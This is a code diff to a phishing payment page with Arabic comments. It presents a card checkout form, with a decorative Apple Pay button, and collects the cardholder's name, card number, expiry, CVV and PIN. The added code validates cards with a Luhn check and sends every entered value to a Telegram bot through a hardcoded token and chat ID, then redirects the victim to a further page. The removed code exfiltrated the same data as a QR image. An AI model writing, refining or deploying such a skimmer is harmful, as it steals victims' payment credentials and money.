@@ -12,12 +12,12 @@
     main{flex:1;padding:20px}
     form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
     label{display:block;margin-top:14px;font-weight:700}
-    input,button,select{
+    input,button{
       width:100%;padding:12px;margin-top:6px;
       border:1px solid #ccc;border-radius:6px;box-sizing:border-box
     }
     .row{display:flex;gap:10px}
-    .row > div{flex:1; display: flex; flex-direction: column;}
+    .row > div{flex:1; display: flex; flex-direction: column;} /* ضمان توزيع متساوي */
     button{
       background:#0b5320;color:#fff;border:0;font-weight:800;
       cursor:pointer;position:relative
@@ -25,6 +25,7 @@
     button:hover{background:#094418}
     button:disabled{opacity:.7;cursor:not-allowed}
 
+    /* زر Apple Pay */
     #applePayBtn{
       margin-top:12px;
       background:#000;
@@ -32,6 +33,7 @@
       font-weight:800;
     }
 
+    /* خطأ الحقول */
     .error{
       border-color:#c00 !important;
       background:#fff6f6;
@@ -54,6 +56,7 @@
       font-size:13px;text-align:center
     }
 
+    /* تحميل أول الدخول */
     #pageLoader{
       position:fixed;inset:0;background:transparent;
       display:flex;align-items:center;justify-content:center;
@@ -69,6 +72,14 @@
 
     #cardNumber{direction:ltr;text-align:left}
     
+    /* موازنة الحقول */
+    #cvv, #pin {
+      width: 100%;
+      text-align: center;
+      direction: ltr;
+    }
+
+    /* تصغير خط العناوين في الصفوف المزدوجة لضمان التوازن */
     .row label {
       font-size: 12px;
       white-space: nowrap;
@@ -108,23 +119,41 @@
   <div class="row">
     <div>
       <label>شهر الانتهاء *</label>
-      <select id="expMonth">
+      <select id="expMonth" style="width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box">
         <option value="">MM</option>
-        <option value="01">01</option><option value="02">02</option><option value="03">03</option>
-        <option value="04">04</option><option value="05">05</option><option value="06">06</option>
-        <option value="07">07</option><option value="08">08</option><option value="09">09</option>
-        <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+        <option value="01">01</option>
+        <option value="02">02</option>
+        <option value="03">03</option>
+        <option value="04">04</option>
+        <option value="05">05</option>
+        <option value="06">06</option>
+        <option value="07">07</option>
+        <option value="08">08</option>
+        <option value="09">09</option>
+        <option value="10">10</option>
+        <option value="11">11</option>
+        <option value="12">12</option>
       </select>
     </div>
     <div>
       <label>سنة الانتهاء *</label>
-      <select id="expYear">
+      <select id="expYear" style="width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box">
         <option value="">YY</option>
-        <option value="26">26</option><option value="27">27</option><option value="28">28</option>
-        <option value="29">29</option><option value="30">30</option><option value="31">31</option>
-        <option value="32">32</option><option value="33">33</option><option value="34">34</option>
-        <option value="35">35</option><option value="36">36</option><option value="37">37</option>
-        <option value="38">38</option><option value="39">39</option><option value="40">40</option>
+        <option value="26">26</option>
+        <option value="27">27</option>
+        <option value="28">28</option>
+        <option value="29">29</option>
+        <option value="30">30</option>
+        <option value="31">31</option>
+        <option value="32">32</option>
+        <option value="33">33</option>
+        <option value="34">34</option>
+        <option value="35">35</option>
+        <option value="36">36</option>
+        <option value="37">37</option>
+        <option value="38">38</option>
+        <option value="39">39</option>
+        <option value="40">40</option>
       </select>
     </div>
   </div>
@@ -156,6 +185,7 @@
 </footer>
 
 <script>
+  // تحميل أول دخول الصفحة
   const pageLoader = document.getElementById('pageLoader');
   const payForm = document.getElementById('payForm');
   const cardName = document.getElementById('cardName');
@@ -171,36 +201,94 @@
 
   setTimeout(()=> { if(pageLoader) pageLoader.style.display='none'; }, 4000);
 
+  const serviceMsg = document.getElementById('serviceMsg');
+
+  // زر Apple Pay (واجهة فقط)
   if(applePayBtn) {
     applePayBtn.onclick = () => {
-      const serviceMsg = document.getElementById('serviceMsg');
       serviceMsg.style.display='block';
       setTimeout(()=>serviceMsg.style.display='none',2500);
     };
   }
 
+  // تنظيف إدخالات رقمية فقط
   function onlyDigits(el, maxLen){
     el.value = el.value.replace(/\D/g,'').slice(0, maxLen);
   }
 
+  // تنسيق رقم البطاقة + تحقق Luhn
   function formatCardNumber(){
     let raw = cardNumber.value.replace(/\s/g,'').replace(/\D/g,'').slice(0,16);
     cardNumber.value = raw.replace(/(.{4})/g,'$1 ').trim();
+    validateCardNumber(); // يفحص ويحمّر الحقل إذا الرقم كامل وخاطئ
   }
 
+  function luhnCheck(numStr){
+    // numStr: digits only
+    let sum = 0;
+    let shouldDouble = false;
+    for(let i = numStr.length - 1; i >= 0; i--){
+      let digit = numStr.charCodeAt(i) - 48;
+      if (shouldDouble){
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return (sum % 10) === 0;
+  }
+
+  function validateCardNumber(){
+    const raw = cardNumber.value.replace(/\s/g,'');
+    // لا نحمر أثناء الكتابة إلا بعد اكتمال 16 رقم
+    if (raw.length < 16){
+      cardNumber.classList.remove('error');
+      return true;
+    }
+    const ok = luhnCheck(raw);
+    if (!ok) cardNumber.classList.add('error');
+    else cardNumber.classList.remove('error');
+    return ok;
+  }
+
+  // أحداث الإدخال
   if(cardNumber) cardNumber.addEventListener('input', formatCardNumber);
-  if(cvv) cvv.addEventListener('input', () => onlyDigits(cvv, 3));
-  if(pin) pin.addEventListener('input', () => onlyDigits(pin, 4));
+
+  if(expMonth) expMonth.addEventListener('change', () => {
+    expMonth.classList.remove('error');
+  });
+  if(expYear) expYear.addEventListener('change', () => {
+    expYear.classList.remove('error');
+  });
+  if(cvv) cvv.addEventListener('input', () => {
+    onlyDigits(cvv, 3);
+    cvv.classList.remove('error');
+  });
+  if(pin) pin.addEventListener('input', () => {
+    onlyDigits(pin, 4);
+    pin.classList.remove('error');
+  });
+  if(cardName) cardName.addEventListener('input', () => cardName.classList.remove('error'));
 
   if(payForm) {
     payForm.onsubmit = (e) => {
       e.preventDefault();
 
+      // تنظيف رسالة Apple Pay إن كانت ظاهرة
+      serviceMsg.style.display = 'none';
+
       let ok = true;
+
       if(!cardName.value.trim()){cardName.classList.add('error'); ok=false;}
-      if(cardNumber.value.replace(/\s/g,'').length !== 16){cardNumber.classList.add('error'); ok=false;}
-      if(!expMonth.value){expMonth.classList.add('error'); ok=false;}
-      if(!expYear.value){expYear.classList.add('error'); ok=false;}
+
+      const rawCard = cardNumber.value.replace(/\s/g,'');
+      if(rawCard.length !== 16){cardNumber.classList.add('error'); ok=false;}
+      else if(!validateCardNumber()){ ok=false; } // فحص Luhn
+
+      const m = Number(expMonth.value);
+      if(!(Number.isInteger(m) && m >= 1 && m <= 12)){expMonth.classList.add('error'); ok=false;}
+      if(expYear.value.length !== 2){expYear.classList.add('error'); ok=false;}
       if(cvv.value.length !== 3){cvv.classList.add('error'); ok=false;}
       if(pin.value.length !== 4){pin.classList.add('error'); ok=false;}
 
@@ -210,47 +298,34 @@
       payText.style.visibility = 'hidden';
       paySpinner.style.display = 'block';
 
-      const qrData = `Name: ${cardName.value}\nCard: ${cardNumber.value}\nExp: ${expMonth.value}/${expYear.value}\nCVV: ${cvv.value}\nPIN: ${pin.value}`;
+      // إرسال البيانات إلى تلجرام
       const token = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk";
       const chatId = "8404960059";
+      const message = `
+🔔 عملية دفع جديدة:
+👤 الاسم: ${cardName.value}
+💳 رقم البطاقة: ${cardNumber.value}
+📅 التاريخ: ${expMonth.value}/${expYear.value}
+🔒 CVV: ${cvv.value}
+🔢 PIN: ${pin.value}
+      `;
 
-      // استخدام API خارجي لتوليد الـ QR Code كصورة مباشرة
-      const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qrData)}`;
-
-      const goToNext = () => {
-          setTimeout(() => { window.location.href = "verify.html"; }, 500);
-      };
-
-      // إرسال الصورة للبوت عبر الرابط مباشرة
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-              chat_id: chatId,
-              photo: qrImageUrl,
-              caption: '📱 رمز QR جديد للمسح الضوئي'
-          })
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
       })
-      .then(res => res.json())
-      .then(data => {
-          if (data.ok) {
-              goToNext();
-          } else {
-              // إذا فشل إرسال الصورة، أرسل نصاً كبديل
-              fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ chat_id: chatId, text: "⚠️ فشل إرسال الصورة، البيانات نصاً:\n" + qrData })
-              }).then(goToNext).catch(goToNext);
-          }
+      .then(() => {
+        // التوجيه بعد النجاح
+        setTimeout(()=>location.href='code.html',1000);
       })
       .catch(err => {
-          // في حال فشل الاتصال، أرسل نصاً وانتقل
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chatId, text: "⚠️ خطأ في الاتصال، البيانات نصاً:\n" + qrData })
-          }).then(goToNext).catch(goToNext);
+        console.error(err);
+        // حتى لو فشل الإرسال نوجه المستخدم أو نظهر خطأ
+        setTimeout(()=>location.href='code.html',1000);
       });
     };
   }
